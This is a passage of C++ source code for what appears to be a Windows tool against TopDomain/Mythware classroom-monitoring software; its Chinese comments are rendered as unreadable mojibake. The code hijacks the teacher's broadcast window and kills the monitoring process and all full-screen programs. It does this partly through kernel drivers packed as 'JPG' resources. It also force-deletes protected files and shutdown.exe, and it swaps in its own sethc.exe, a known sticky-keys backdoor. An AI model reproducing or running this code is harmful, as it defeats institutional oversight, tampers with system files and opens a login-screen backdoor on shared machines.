		SetParent(hwnd, TDhWndGrandParent);//�Ӵ��ڱ���׽��"��Ļ�㲥"����ҲӦ�õõ����ƴ��á�
		TDhWndParent = hwnd;//�����Թ�DestroyWindow��ShowWindow(SW_HIDE)��Щ��׼����������û��Ч��
		return STOP_SEARCH;//���ﴴ��һ���������Ĵ��ڣ���"��Ļ�㲥"���ڲ�׽��ȥ
	}
	return  CONTINUE_SEARCH;
}
BOOL CALLBACK EnumBroadcastwndOld(HWND hwnd, LPARAM lParam)//���ұ�����㲥���ڵ�ö�ٺ���.
{
	if (!IsWindowVisible(hwnd))return CONTINUE_SEARCH;
	wchar_t title[MAX_STR];//���ϰ汾�ļ�������û��TDDesk Render Window������㲥����Ҳ����"��Ļ�㲥"��������Ҫר�Ŵ���
	GetWindowText(hwnd, title, MAX_STR);//�����������2007��2010��2012�汾�ļ���
	if (mywcsstr(title, L"��Ļ�ݲ��Ҵ���") != 0 || mywcsstr(title, L"��Ļ�㲥����") != 0)//��Ļ�ݲ��Ҵ���->2010 or 2012�棬��Ļ�㲥����->2007��
	{
		TDhWndChild = hwnd; TDhWndParent = (HWND)(-2);
		SetWindowLong(hwnd, GWL_STYLE, WS_POPUP | WS_VISIBLE | WS_CLIPSIBLINGS | WS_CAPTION | WS_SYSMENU | WS_THICKFRAME | WS_MINIMIZEBOX | WS_MAXIMIZEBOX);
		SetWindowLong(hwnd, GWL_EXSTYLE, WS_EX_WINDOWEDGE | WS_EX_TOPMOST | WS_EX_LEFT | WS_EX_CLIENTEDGE);
		SetParent(hwnd, CatchWnd);//2010��2012�漫��ʹ���������Ч���Ϻã�
		++EatList[0];//����2007�汾������ʹ�á���Ϊ2007�汾�ļ���㲥��֧���Զ����ţ�
		EatList[(size_t)(EatList[0]) / 4] = hwnd;//���ڻ���ֻ����ʾ��ʦ��Ļ��һ����
		return STOP_SEARCH;
	}
	return CONTINUE_SEARCH;
}
BOOL CALLBACK EnumMonitoredwnd(HWND hwnd, LPARAM lParam)//���ұ����Ӵ��ڵ�ö�ٺ���.
{//����һ���ܾ���ǰд�õĹ��ܣ���ͼͨ�����ڼ��ӣ����Ƽ���㲥���ݵ��Լ���������ʵ��"���򴰿ڻ�"
	ULONG nProcessID;//�����������Ѿ������������õķ�������һ���ܾ�ûʲô�����ˡ�
	if (IsWindowVisible(hwnd))//���ܻ�����һ���汾�Ƴ�(������һ���汾ô= =)
	{
		RECT rc;
		GetWindowRect(hwnd, &rc);
		if (rc.right - rc.left < 15 || rc.bottom - rc.top < 15)return 1;//��С�Ĵ��ڽ���������
		::GetWindowThreadProcessId(hwnd, &nProcessID);//���pid��ȷ����hWnd��¼����
		if (tdpid[nProcessID])
			MonitorList[++MonitorTot] = hwnd;
	}
	return CONTINUE_SEARCH;
}
#pragma warning(default:4100)//�ָ�����

void FindMonitoredhWnd(wchar_t* ProcessName)//���ұ����ӵĴ���.
{
	Map<int, BOOL>::Iterator it = tdpid.Begin();
	if (it != 0)
		while (it != tdpid.End()) {
			(*it).second = FALSE;
			++it;
		}
	ProcessName[3] = 0;
	mywcslwr(ProcessName);
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);
	Process32First(hSnapShot, &pe);
	while (Process32Next(hSnapShot, &pe))
	{
		pe.szExeFile[3] = 0;
		mywcslwr(pe.szExeFile);//��¼�·���Ҫ���pid
		if (mywcsstr(pe.szExeFile, ProcessName) != 0)tdpid[pe.th32ProcessID] = TRUE;
	}
	if (!EnumWindows(EnumMonitoredwnd, NULL))error();
}

BOOL CALLBACK EnumFullScreenWnd(HWND hwnd, LPARAM lParam)//ɱ��ȫ�����ڵ�ö�ٺ���
{//ö���ö�����
	UNREFERENCED_PARAMETER(lParam);
	ULONG nProcessID; HANDLE hProcessHandle = 0;
	RECT rc; GetWindowRect(hwnd, &rc);
	::GetWindowThreadProcessId(hwnd, &nProcessID);//Ѱ��ȫ������
	if (rc.left == 0 && rc.top == 0 && rc.bottom == yLength && rc.right == xLength)
	{
		::GetWindowThreadProcessId(hwnd, &nProcessID);
		if (GetCurrentProcessId() == nProcessID || expid[nProcessID] == TRUE)goto skipped;//����Ǳ�zi��ji��de�Ľ���ID -> ����
		hProcessHandle = OpenProcess(PROCESS_TERMINATE, FALSE, nProcessID);//���ڽ�������ȫ�����ò���Nt�ĺ���
		TerminateProcess(hProcessHandle, 1);//(������������û����NtTerminateProc�����ù�,ֻ������������)
	}
skipped:
	return 1;
}
bool KillFullScreen()//ɱ��ȫ������
{
	Map<int, BOOL>::Iterator it = expid.Begin();//���map
	if (it != 0)while (it != expid.End()) (*it).second = FALSE, ++it;
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);
	Process32First(hSnapShot, &pe);
	while (Process32Next(hSnapShot, &pe))
	{
		pe.szExeFile[3] = 0;
		if (mywcsstr(pe.szExeFile, L"exp") != 0)expid[pe.th32ProcessID] = TRUE;
	}//��Explorer��Pid���뱣��������
	if (!EnumWindows(EnumFullScreenWnd, NULL)) { error(); return false; }
	return true;
}

#pragma warning(disable:28182)
#pragma warning(disable:28183)
BOOL KillProcess(LPCWSTR ProcessName)//���ݽ�������������.
{
	if (*ProcessName == 0)return FALSE;
	wchar_t* MyProcessName = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(wchar_t) * MAX_STR * 4), TempStr[MAX_STR * 4], * Pointer1, * Pointer2, DriverPath[MAX_PATH];

	if (Main.Check[CHK_FMACH].Value == TRUE)
	{//��ȫƥ�������
		mywcscpy(MyProcessName, ProcessName);
		mywcslwr(MyProcessName);
		if (mywcsstr(MyProcessName, L".exe") == 0)mywcscat(MyProcessName, L".exe");
	}
	else
	{
		mywcscpy(TempStr, ProcessName);
		Pointer1 = Pointer2 = TempStr;
		while (mywcsstr(Pointer1, L"|") != 0)
		{
			Pointer2 = mywcsstr(Pointer1, L"|");
			Pointer2[0] = 0;//������"|"�ָ��Ĳ�ͬ������
			Pointer1[3] = 0;//��ÿ��"|"ǰ���ַ���תΪСд��ֻ����ǰ������ĸ
			mywcscat(MyProcessName, Pointer1);
			mywcscat(MyProcessName, L"|");
			Pointer1 = Pointer2 + 1;
		}
		Pointer1[3] = 0;
		mywcscat(MyProcessName, Pointer1);
		mywcslwr(MyProcessName);
	}

	BOOL ReturnValue = FALSE, NoProcess = TRUE;
	HANDLE PhKphHandle = 0;
	BOOL ConnectSuccess = FALSE;//��������KProcessHacker
	if (KphConnect(&PhKphHandle) >= 0)ConnectSuccess = TRUE;
	if (ConnectSuccess && Bit == 34)
	{//32λTDT��64λϵͳ����KProcessHacker��������ʱ��Ҫ��Win64KPHcaller
		mywcscpy(DriverPath, TDTempPath);
		mywcscat(DriverPath, L"Win64KPHcaller.exe");
		ReleaseRes(DriverPath, FILE_CALLER, L"JPG");
	}
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe;//�������̿���
	pe.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(hSnapShot, &pe))return FALSE;
	while (Process32Next(hSnapShot, &pe))
	{
		if (Main.Check[CHK_FMACH].Value == FALSE)pe.szExeFile[3] = 0;//���ݽ�����ǰ�����ַ���ʶ
		mywcslwr(pe.szExeFile);
		if (mywcsstr(MyProcessName, pe.szExeFile) != 0 || ProcessName == NULL)
		{
			NoProcess = FALSE;
			HANDLE hProcess = 0;
			if (Main.Check[CHK_KPH].Value && ConnectSuccess)
			{//���ӳɹ�->��������������
				if (Bit != 34)
				{
#pragma warning(disable:4312)//64λ������ᱨHANDLE����DWORD�ľ���
					PhOpenProcess(&hProcess, 1, (HANDLE)pe.th32ProcessID, PhKphHandle);
#pragma warning(default:4312)
					ReturnValue |= PhTerminateProcess(hProcess, 1, PhKphHandle) >= 0;
				}
				else
				{
					wchar_t cmdline[MAX_PATH], PIDStr[MAX_NUM];
					myZeroMemory(PIDStr, sizeof(wchar_t) * MAX_NUM);
					mywcscpy(cmdline, DriverPath);//ʹ��Win64KPHcaller
					myitow(pe.th32ProcessID, PIDStr, MAX_NUM);
					mywcscat(cmdline, L" ");
					mywcscat(cmdline, PIDStr);
					ReturnValue |= RunEXE(cmdline, NULL, nullptr);
				}
			}
			else
			{
				hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
				ReturnValue |= TerminateProcess(hProcess, 1);//����ʹ����ͨ��OpenProcess��TerminateProcess
			}
			if (hProcess)CloseHandle(hProcess);
		}
	}
	if (ConnectSuccess && Bit == 34)DeleteFile(DriverPath);//ɾ��Win64KPHcaller

	HeapFree(GetProcessHeap(), 0, MyProcessName);
	return ReturnValue || NoProcess;//����ҵ��˽��̣���û�����ɹ�������FALSE
}
#pragma warning(default:28182)
#pragma warning(default:28183)

BOOL GetTDVer(wchar_t* source)//��ȡ����汾.
{//����ֵ���Ƶ�source��
	if (source == NULL)return FALSE;//��source��û�е�Ȼֱ���˳�
	mywcscpy(source, Main.GetStr(L"_TTDv"));//��ǰ�����"����汾��"֮����ַ���
	HKEY hKey;
	LONG ret;//��׼��ע������
	wchar_t szLocation[100];
	myZeroMemory(szLocation, sizeof(wchar_t) * 100);
	DWORD dwSize = sizeof(wchar_t) * 100;
	DWORD dwType = REG_SZ;
	if (Bit != 64)//64λʱҪ�ֶ��ض���WOW6432Node��
		ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\TopDomain\\e-Learning Class V6.0", 0, KEY_READ, &hKey);
	else//��˵���ڼ������Ҳ��64λ����ô��
		ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\TopDomain\\e-Learning Class V6.0", 0, KEY_READ, &hKey);

	if (ret != 0)//��ʧ��
	{
		if (Bit != 64)//�ٿ����ϼ�Ŀ¼�治����
			ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\TopDomain", 0, KEY_READ, &hKey);
		else//(��Ϊ�ܾɰ�ļ���û��v6.0�����������ȫ�޷���ȡ�汾��)
			ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\TopDomain", 0, KEY_READ, &hKey);
		if (ret != 0)//��TopDomainĿ¼��û�У�������ܲ�����
			mywcscat(source, Main.GetStr(L"TTDunk"));
		else//����汾Ϊ2007֮�࣬����ģ�����ɵĴ�
			mywcscat(source, Main.GetStr(L"TTDold"));
		RegCloseKey(hKey);
		return TRUE;
	}//�򿪳ɹ������������Ŀ¼
	ret = RegQueryValueExW(hKey, L"Version", 0, &dwType, (LPBYTE)&szLocation, &dwSize);
	if (ret != 0)return FALSE;//�򿪳ɹ�ȴû�м�ֵ? -> �Ҳ���
	if (*szLocation != 0)mywcscat(source, szLocation);//�ҵ� ->�������ذ汾��
	else return FALSE;//��ֵΪ��?? -> �Ҳ���
	RegCloseKey(hKey);//�رվ��
	return TRUE;
}

void TDSearchDirect()
{//ֱ�ӵ���SearchToolѰ��studentmain.exe�ĺ���
	SearchTool(L"C:\\Program Files\\Mythware", 1);
	SearchTool(L"C:\\Program Files\\TopDomain", 1);//��������ר��Ŀ¼����
	SearchTool(L"C:\\Program Files (x86)\\Mythware", 1);
	SearchTool(L"C:\\Program Files (x86)\\TopDomain", 1);
	if (*TDPath != NULL)return;
	SearchTool(L"C:\\Program Files (x86)", 1);
	if (*TDPath != NULL)return;//������������Program Files����
	SearchTool(L"C:\\Program Files", 1);
	if (*TDPath != NULL)return;
	SearchTool(L"C:\\Users", 1);
	if (*TDPath != NULL)return;//��������ProgramData��AppData��ЩĿ¼����
	SearchTool(L"C:\\ProgramData", 1);
}
void SetTDPathStr()//���Ĳ��Զ��ػ����ҳ��"����·��"����ַ���
{
	if (!TDsearched)return;
	wchar_t TDPathStr[MAX_PATH];
	myZeroMemory(TDPathStr, sizeof(wchar_t) * MAX_PATH);
	mywcscpy(TDPathStr, Main.GetStr(L"_TPath"));
	if (*TDPath == 0)//�Ҳ�������ʱ��ʾTPunk�ַ���
		mywcscat(TDPathStr, Main.GetStr(L"TPunk"));
	else
		mywcscat(TDPathStr, TDPath);
	if (mywcslen(TDPathStr) > 45)mywcscpy(TDPathStr + 44, L"...");
	Main.SetStr(TDPathStr, L"TPath");
	if (Main.CurWnd != 4)return;//����"����"ҳ���ʱ��Ͳ���ˢ����
	RECT rc{ (int)(170 * Main.DPI), (int)(365 * Main.DPI),(int)(DEFAULT_WIDTH * Main.DPI),(int)(390 * Main.DPI) };
	Main.es[++Main.es[0].top] = rc;
	Main.Readd(REDRAW_TEXT, 24);//����textʱ�ǵø���"24"�������
	Main.Redraw(rc);
}
DWORD WINAPI ReopenThread2(LPVOID pM)//�����ҵ�����(�߳�)
{
	(pM);
	if (!TDsearched) TDSearchDirect(), TDsearched = TRUE;
	SetTDPathStr();
	return 0;
}
void UpdateInfo()//�޸�"����"������Ϣ�ĺ���.
{
	wchar_t tmp[MAX_PATH], tmp2[MAX_PATH]; int f;

	myZeroMemory(tmp, sizeof(wchar_t) * MAX_PATH);

	mywcscpy(tmp2, Main.GetStr(L"Tbit"));//ϵͳλ��
	if (Bit == 32)mywcscat(tmp2, L"32"); else mywcscat(tmp2, L"64");
	Main.SetStr(tmp2, L"Tbit");
	GetOSDisplayString(tmp);//ϵͳ�汾
	mywcscpy(tmp2, Main.GetStr(L"Twinver")); mywcscat(tmp2, tmp);
	Main.SetStr(tmp2, L"Twinver");
	if (Bit == 34)f = GetFileAttributes(L"C:\\windows\\sysnative\\cmd.exe"); else f = GetFileAttributes(L"C:\\windows\\system32\\cmd.exe");
	mywcscpy(tmp2, Main.GetStr(L"Tcmd"));//�Ƿ���cmd
	if (f != -1)mywcscat(tmp2, Main.GetStr(L"TcmdOK")); else mywcscat(tmp2, Main.GetStr(L"TcmdNO"));

	Main.SetStr(tmp2, L"Tcmd");
	mywcscpy(tmp2, Main.GetStr(L"TIP"));
	CheckIP(tmp2);//ip��ַ
	Main.SetStr(tmp2, L"TIP");//����汾
	if (GetTDVer(tmp2))Main.SetStr(tmp2, L"TTDv");
	CreateThread(0, 0, ReopenThread2, 0, 0, 0);//Ѱ�Ҽ���·��
}
void RefreshFrameText()//�����Ƿ��й���ԱȨ�޵���������ı�Frame�ϵ�����.
{
	mywcscat(Main.Frame[FRA_PASSWORD].Name, Main.GetStr(L"nRec"));
	const int ok[]{ FRA_WINDOW,FRA_CHANNEL }, useless[]{ FRA_PROCESS, FRA_DELETER,FRA_OTHERS };
	for (int i = 0; i < 2; ++i)Main.Frame[ok[i]].rgb = COLOR_OK, mywcscat(Main.Frame[ok[i]].Name, Main.GetStr(L"Usable"));

	if (!Admin)
		for (int i = 0; i < 3; ++i)Main.Frame[useless[i]].rgb = COLOR_RED, mywcscat(Main.Frame[useless[i]].Name, Main.GetStr(L"Useless"));
	else
	{
		Main.Frame[FRA_PROCESS].rgb = COLOR_NOTREC;
		mywcscat(Main.Frame[FRA_PROCESS].Name, Main.GetStr(L"nRec"));
	}
	Main.Frame[FRA_GAMES].rgb = COLOR_GREEN;
}
void GetPath()//�õ�����·�� & ( ����·�� + ������ ).
{
	GetModuleFileName(NULL, Path, MAX_PATH);//ֱ�ӻ�ȡ������
	mywcscpy(Name, Path);
	for (int i = (int)mywcslen(Path) - 1; i >= 0; --i)
		if (Path[i] == L'\\') {//�ѳ������ַ��������һ��"\\"������ַ�ȥ������·��
			Path[i + 1] = 0; return;
		}
}

void GetBit()//ϵͳλ��.
{
	SYSTEM_INFO si;//����Ч�ļ��ϵͳλ���ķ���
	MyGetInfo(&si);//AMD64 \ Intel64 ?
	if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64) Bit = 64; else Bit = 32;
	//32 means 32bit Program on 32bit System
	//34 means 32bit Program on 64bit System
	//64 means 64bit Program on 64bit System
#ifndef _WIN64
	if (Bit == 64)Bit = 34;//�����������λ��
#endif
}
BOOL BackupSethc()//����sethc.exe.
{
	if (GetFileAttributes(TDTempPath) == FILE_ATTRIBUTE_DIRECTORY)return FALSE;//��ʱ�ļ�Ŀ¼�Ѿ����� -> sethc�����Ѿ����ݹ� -> ���ǵ�һ������
	CreateDirectory(TDTempPath, NULL);//����һ����ʱ�ļ���(˵��"��ʱ"����ʵһ�㲻���Զ�ɾ��)
	if (GetFileAttributes(SethcPath) == INVALID_FILE_ATTRIBUTES) { SethcState = FALSE; return FALSE; }//sethc�����Ͳ����� -> ���ǵ�һ������
	return CopyFile(SethcPath, L"C:\\SAtemp\\sethc", TRUE);//��Ϊ��������������л�ԭ������
}

bool EnableTADeleter()
{//���Ժ�DeleteFile����ͨ��.
	if (DeleteFileHandle != 0)return TRUE;//�Ѿ��������������� -> �˳�
	wchar_t DriverPath[MAX_PATH];
	mywcscpy(DriverPath, TDTempPath);
	mywcscat(DriverPath, L"DeleteFile.sys");
	if (Bit == 32)//�ͷ������ļ�������Ŀ¼��
		ReleaseRes(DriverPath, FILE_TAX32, L"JPG");
	else
		ReleaseRes(DriverPath, FILE_TAX64, L"JPG");
	UnloadNTDriver(L"DeleteFile");//��������
	LoadNTDriver(L"DeleteFile", DriverPath, TRUE);
	EnablePrivilege(SE_DEBUG_NAME, 0);//��ȡ����ͨѶ��DEBUGȨ��?

	OBJECT_ATTRIBUTES objectAttributes;
	HMODULE hModule = ::GetModuleHandle(L"ntdll.dll");
	if (hModule == NULL)return FALSE;//Ѱ��ntdll
	NTOPENFILE NtOpenFile = (NTOPENFILE)GetProcAddress(hModule, "NtOpenFile");
	UNICODE_STRING on;
	RtlInitUnicodeString(&on, L"\\Device\\DeleteFile");
	InitializeObjectAttributes(&objectAttributes, &on, 0x40, NULL, NULL);
	IO_STATUS_BLOCK isb;
	NtOpenFile(//����ȡ�������ľ��
		&DeleteFileHandle,
		FILE_GENERIC_READ | FILE_GENERIC_WRITE,
		&objectAttributes,
		&isb,//����ISB
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		0x40
	);
	return (bool)DeleteFileHandle;
}

BOOL EnableKPH()
{//����KProcessHacker����(����ȡ��ͨ��).
	if (Main.Check[CHK_KPH].Value)return TRUE;//����Ѿ����أ��Ͳ����ټ�����
	wchar_t DriverPath[MAX_PATH];
	mywcscpy(DriverPath, TDTempPath);
	mywcscat(DriverPath, L"kprocesshacker.sys");
	if (Bit == 32)
		ReleaseRes(DriverPath, FILE_KPH32, L"JPG");
	else
		ReleaseRes(DriverPath, FILE_KPH64, L"JPG");
	UnloadNTDriver(L"KProcessHacker2");
	EnablePrivilege(SE_DEBUG_NAME, 0);
	return LoadNTDriver(L"KProcessHacker2", DriverPath, TRUE);
}

void UpdateCatchedWindows()
{//ˢ����������"�Ѳ�׽ X ������"����ַ���
	wchar_t tmpstr[MAX_PATH], tmpnum[MAX_NUM];
	myZeroMemory(tmpstr, sizeof(wchar_t) * MAX_PATH);
	myZeroMemory(tmpnum, sizeof(wchar_t) * MAX_NUM);
	myitow((int)((size_t)EatList[0] / 4), tmpnum, MAX_NUM);
	mywcscpy(tmpstr, Main.GetStr(L"Eat1"));
	mywcscat(tmpstr, tmpnum);
	mywcscat(tmpstr, Main.GetStr(L"Eat2"));
	Main.SetStr(tmpstr, L"_Eat");
	if (Main.CurWnd != 1)return;
	Main.Readd(REDRAW_TEXT, 5);
	RECT rc{ (long)(195 * Main.DPI),(long)(480 * Main.DPI),(long)(400 * Main.DPI),(long)(505 * Main.DPI) };
	Main.es[++Main.es[0].top] = rc;
	Main.Redraw(rc);
	if ((int)((size_t)EatList[0] / 4 == 0))Main.EnableButton(BUT_RELS, FALSE); else Main.EnableButton(BUT_RELS, TRUE);
}

/*  �����л�  */

void SwitchLanguage(LPWSTR FilePath)//�ı����Եĺ���
{
	//���������������������ʱ����ֱ���ճ���
	//��Ϊ�漰����ͬ�������Ҫ���⴦��Ŀؼ�������

	//BOOL Mainf = FALSE;//��������ֻ�õ���һ�����ڣ����Ҫʹ�ö�����ڣ����Խ���<Main>֮��ı�ǩ������

	int type = 0; //��ʶ�ؼ����͵ı���
	DWORD NumberOfBytesRead;
	const bool ANSI = mywcsstr(FilePath, L"ANSI");//Ϊ�˽�ʡ�ռ䣬Ӣ���������ļ���ANSI����洢

	HANDLE hHeap = HeapCreate(HEAP_NO_SERIALIZE, 0, 0);
	if (!hHeap)return;
	wchar_t* AllTmp = (wchar_t*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(wchar_t) * MAX_LANGUAGE_LENGTH), * point1, * point2;
	char* ANSIstr = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(char) * MAX_LANGUAGE_LENGTH * 2);//������ڴ�
	if (AllTmp == 0 || ANSIstr == 0)return;

	HANDLE FileHandle = CreateFile(FilePath, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
	if (FileHandle == 0)return;//���ļ�
	if (!ReadFile(FileHandle, ANSIstr, MAX_LANGUAGE_LENGTH * 2, &NumberOfBytesRead, NULL))return;
	if (ANSI) { for (unsigned int i = 0; i < NumberOfBytesRead; ++i)AllTmp[i] = ANSIstr[i]; }
	else MultiByteToWideChar(CP_ACP, 0, ANSIstr, -1, AllTmp, MAX_LANGUAGE_LENGTH);//��ANSI����洢���ļ��������⴦��
	if (NumberOfBytesRead == 0)return;

	point1 = AllTmp;
	while (1)
	{
		point2 = mywcsstr(point1, L"\n");
		if (point2 == 0)break;
		*point2 = 0;
		//if (mywcsstr(point1, L"<Main>") != 0)Mainf = TRUE;//��<>�����ֲ�ͬ����
		//if (mywcsstr(point1, L"</Main>") != 0)Mainf = FALSE;//�������е���xml����
		if (mywcsstr(point1, L"<Buttons>") != 0)type = 1;
		if (mywcsstr(point1, L"<Checks>") != 0)type = 2;
		if (mywcsstr(point1, L"<Strings>") != 0)type = 3;
		if (mywcsstr(point1, L"<Frames>") != 0)type = 4;
		if (mywcsstr(point1, L"<Texts>") != 0)type = 5;
		if (mywcsstr(point1, L"<Edits>") != 0)type = 6;
		if (point1[0] != L'<')
		{
			/*if (Mainf)*/Main.DispatchLanguage(point1, type);//����(����)���������
		}
		point1 = point2 + 1;
	}
	CloseHandle(FileHandle);//��ȡ���ļ���һ��Ҫ�ǵùر�

	if (InfoChecked)UpdateInfo();//�޸�"����"������Ϣ
	SetWindowText(Main.hWnd, Main.GetStr(L"Tmain2"));//���±���
	if (CatchWnd != NULL)SetWindowText(CatchWnd, Main.GetStr(L"Title2"));
	RefreshFrameText();//Frame����

	Main.EnableButton(BUT_MORE, !(bool)mywcsstr(FilePath, L"English"));//�������ֻ�ı�İ�ť
	if (OneClick)mywcscpy(Main.Button[BUT_ONEK].Name, Main.GetStr(L"unQs"));
	if (GameMode == 1)mywcscpy(Main.Button[BUT_GAMES].Name, Main.GetStr(L"Gamee"));
	if (SethcInstallState)mywcscpy(Main.Button[BUT_SETHC].Name, Main.GetStr(L"unSet"));
	if (Main.Button[BUT_SHUTD].Enabled == FALSE)mywcscpy(Main.Button[BUT_SHUTD].Name, Main.GetStr(L"Deleted"));
	if (mywcsstr(FilePath, L"English"))//"���ǹ���Ա"���ֵķ�Χ
		Main.Area[4].Left = 230, Main.Area[4].Width = 110; else Main.Area[4].Left = 176, Main.Area[4].Width = 85;

	UpdateCatchedWindows();//���±������ڵĸ���
	Main.Redraw();
	if (CatchWnd)InvalidateRect(CatchWnd, NULL, FALSE), UpdateWindow(CatchWnd);
	HeapDestroy(hHeap);//�ͷ��ڴ�
}

BOOL SetupSethc()//��װsethc
{
	wchar_t mySethcPath[MAX_PATH];
	mywcscpy(mySethcPath, TDTempPath);
	mywcscat(mySethcPath, L"mysethc.exe");
	if (GetFileAttributes(mySethcPath) == -1)ReleaseRes(mySethcPath, FILE_SETHC, L"JPG");//�ļ������ڵĻ�����Դ���ͷ�
	if (GetFileAttributes(mySethcPath) == -1)return 2;//�ͷ�֮���ļ����ǲ�����??
	return CopyFile(mySethcPath, SethcPath, FALSE);//���Ƴɹ� or ʧ��
}

BOOL AutoSetupSethc()//�Զ���װsethc����Ǻ���.
{
	const int Flag = SetupSethc();
	if (Flag == 0) { Main.InfoBox(L"CSFail"); return FALSE; }//����ʧ��
	if (Flag == 2) { Main.InfoBox(L"NoSethc"); return FALSE; }//�Ҳ����ļ�
	Main.InfoBox(L"suc");
	return TRUE;
}

BOOL MyDeleteFile(LPCWSTR FilePath)
{//�Զ�ʹ������ or Ӧ�ò�ɾ��һ���ļ�.
	if (Main.Check[CHK_T_A_].Value == 1)
	{
		if (!DeleteFileHandle)return FALSE;//����δ���������˳�
		DWORD ReturnValue[2];//useless value
		wchar_t DriverPath[MAX_PATH], * Pointer1 = DriverPath, ** Pointer2 = &Pointer1;//ע�⴫��ȥ����ָ��ָ���ָ��
		mywcscpy(DriverPath, L"\\??\\");/*·��ǰҪ���� "\??\" ��һ�ַ���		*/
		mywcscat(DriverPath, FilePath);
		DeviceIoControl(DeleteFileHandle, CTL_CODE(0x22, 0x360, 0, 0), Pointer2, \
			sizeof(Pointer2), ReturnValue, sizeof(ReturnValue), &ReturnValue[1], nullptr);//����ȥ��CTL_CODE(������)�еĵڶ���functionһ����0x800~0x2000
		return TRUE;//Ȼ������ܲ���׼��ʹ�õ���0x360 (0x0~0x799��������ϵͳ����Ӧ����ͨӦ�ó���ʹ��)
	}
	else return DeleteFile(FilePath);

}

void GetDeviceRect()
{
	HDC hdcScreen = GetDC(NULL);
	xLength = GetDeviceCaps(hdcScreen, HORZRES);
	yLength = GetDeviceCaps(hdcScreen, VERTRES);
	DeleteObject(hdcScreen);
}
void GetRealCommandLine(wchar_t* cmdl)
{
	//*cmdl = 0;
	wchar_t* t = GetCommandLine(), * a, * b;
	//s(t);
	if (t == 0)return;
	a = mywcsstr(t, L" ");
	if (a == 0)  return;
	b = mywcsstr(t, L"\"");
	if (b == 0 || b > a) { mywcscpy(cmdl, a + 1); return; }
	else
	{
		b = mywcsstr(b + 1, L"\"");
		if (b == 0)return;
		mywcscpy(cmdl, b + 1);
	}
}
BOOL DeleteSethc()//ɾ��sethc(ɾ�����Ļ��Զ�ʹ������).
{
	if (GetFileAttributes(SethcPath) == -1)return TRUE;//sethc�Ѿ�û�� -> �ɹ�
	TakeOwner(SethcPath);//ȡ������Ȩ
	const wchar_t XPsethcPath[] = L"C:\\Windows\\system32\\dllcache\\sethc.exe";//ɾ��xp��sethc�����ļ�
	TakeOwner(XPsethcPath);
	DeleteFile(XPsethcPath);
	if (DeleteFile(SethcPath))return TRUE;//�Ѿ�ɾ���� -> �˳�
	else
	{
		if (Admin == FALSE)return FALSE;//ɾ��������û�й���ԱȨ�� -> ʧ���˳�
		EnableTADeleter();
		Main.Check[CHK_T_A_].Value = 1;//��������
		MyDeleteFile(XPsethcPath);
		return MyDeleteFile(L"C:\\Windows\\system32\\sethc.exe");//�����Ƿ�ɹ�
	}
}

BOOL SearchTool(LPCWSTR lpPath, int type)//1:�򿪼��� 2:ɾ��shutdown 3:ɾ���ļ���.
{//�ж�����ܵĺ��������Խ���"Tool"
	wchar_t szFind[MAX_PATH], szFile[MAX_PATH];//�������ܵ����������ͬС�죬���ԾͰ����Ǻϲ�������
	WIN32_FIND_DATA FindFileData;//ע:��������ֵ����Ҫ����
	mywcscpy(szFind, lpPath);
	mywcscat(szFind, L"\\*.*");
	HANDLE hFind = FindFirstFile(szFind, &FindFileData);
	if (INVALID_HANDLE_VALUE == hFind) return TRUE;
	while (TRUE)
	{
		if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{//������һ���ļ���
			if (!(FindFileData.cFileName[0] == '.' && (mywcslen(FindFileData.cFileName) == 1 || (mywcslen(FindFileData.cFileName) == 2 && FindFileData.cFileName[1] == '.'))))
			{//���ǿ�ͷ��"."�Ļ����ļ���
				mywcscpy(szFile, lpPath);
				mywcscat(szFile, L"\\");
				mywcscat(szFile, FindFileData.cFileName);
				if (!SearchTool(szFile, type))return FALSE;//�ݹ����
				if (type == 3)RemoveDirectory(szFile);
			}//ɾ��������ļ����ڵ��ļ���ɾ��������ļ���
		}
		else
		{//������һ���ļ�
			mywcslwr(FindFileData.cFileName);
			if (type == 1) {
				if (mywcsstr(FindFileData.cFileName, L"studentmain.exe") != NULL)
				{//���Ҳ�����studentmain
					mywcscpy(TDName, FindFileData.cFileName);
					mywcscpy(szFile, lpPath);
					mywcscat(szFile, L"\\");
					mywcscat(szFile, FindFileData.cFileName);
					mywcscpy(TDPath, szFile);
					return FALSE;
				}
			}
			if (type == 2)//ɾ��shutdown
				if (mywcsstr(FindFileData.cFileName, L"shutdown.exe") != NULL)
				{
					mywcscpy(szFile, lpPath);
					mywcscat(szFile, L"\\");
					mywcscat(szFile, FindFileData.cFileName);
					TakeOwner(szFile);
					DeleteFile(szFile);
				}
			if (type == 3)
			{//�ݹ�ɾ��һ���ļ���
				mywcscpy(szFile, lpPath);
				mywcscat(szFile, L"\\");
				mywcscat(szFile, FindFileData.cFileName);
				TakeOwner(szFile);//ȡ������ļ�������Ȩ
				MyDeleteFile(szFile);
				RemoveDirectory(szFile);
			}
		}
		if (!FindNextFile(hFind, &FindFileData))break;//û����һ���ļ���
	}
	FindClose(hFind);//�رվ��
	return TRUE;
}
void AutoDelete(const wchar_t* FilePath, BOOL sli)//�Զ�ɾ���ļ�.
{
	const int FileType = GetFileAttributes(FilePath);
	if (FileType == -1)
	{//�����ļ�Ҳ�����ļ���?�Ƿ�ǿ��ɾ��?
		if (!sli)
		{
